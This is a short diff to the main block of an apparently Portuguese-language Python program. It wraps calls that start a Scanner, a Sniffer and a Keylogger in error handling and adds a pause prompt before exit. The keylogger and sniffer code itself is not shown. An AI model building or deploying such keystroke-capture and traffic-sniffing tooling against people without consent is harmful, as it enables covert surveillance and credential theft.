@@ -318,10 +318,14 @@ def logging(text):
 COMPANY = 1
 
 if __name__ == "__main__":
-    logging("Iniciou do programa!")
-    update_aux_data()
-    Scanner().start()
-    Sniffer().start()
-    logging("Iniciou do KeyLogger!")
-    keylogger = Keylogger()
-    keylogger.start()
+    try:
+        logging("Iniciou do programa!")
+        update_aux_data()
+        Scanner().start()
+        Sniffer().start()
+        logging("Iniciou do KeyLogger!")
+        keylogger = Keylogger()
+        keylogger.start()
+    except Exception as e:
+        logging(str(e))
+        input("Pressione Enter para sair...")
